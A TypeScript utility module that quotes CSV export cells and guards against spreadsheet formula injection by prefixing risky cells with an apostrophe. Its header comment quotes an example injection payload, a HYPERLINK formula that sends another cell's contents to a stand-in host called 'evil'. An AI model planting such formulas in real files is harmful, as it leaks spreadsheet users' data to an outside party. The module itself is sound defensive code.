/**
 * Shared CSV cell encoding for every CSV export (server and client).
 *
 * Besides RFC 4180 quoting, cells are protected against spreadsheet formula injection: a text
 * cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return is evaluated as a formula
 * by Excel / Sheets / LibreOffice even when quoted (e.g. a customer named
 * `=HYPERLINK("http://evil/?"&A2,"Click")`). Such cells get a leading apostrophe, which the
 * spreadsheet shows as plain text. Plain numbers (`-150.00`, `+3`, `-$1,234.50`, `-12%`) are left
 * alone so negative amounts stay numeric.
 */

export type CsvValue = string | number | boolean | null | undefined;

const FORMULA_START = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^[-+]?\$?(\d[\d,]*(\.\d*)?|\.\d+)%?$/;

/** The cell's text with a leading apostrophe when it would start a spreadsheet formula. */
export function csvSafeText(value: CsvValue): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (typeof value === 'number' || typeof value === 'boolean') return s;
  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) return `'${s}`;
  return s;
}

/**
 * Inverse of csvSafeText for importers that read our own CSV exports: drops the one leading
 * apostrophe csvSafeText adds in front of a formula-like cell ("'-Acme" → "-Acme"). Any other
 * text is returned unchanged.
 */
export function csvUnsafeText(value: string): string {
  if (value.startsWith("'")) {
    const rest = value.slice(1);
    if (FORMULA_START.test(rest) && !PLAIN_NUMBER.test(rest)) return rest;
  }
  return value;
}

/** Always-quoted CSV cell ("..."), formula-safe. */
export function csvQuoted(value: CsvValue): string {
  return `"${csvSafeText(value).replace(/"/g, '""')}"`;
}

/** CSV cell quoted only when it contains a quote, comma or line break; formula-safe. */
export function csvMinimal(value: CsvValue): string {
  const s = csvSafeText(value);
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
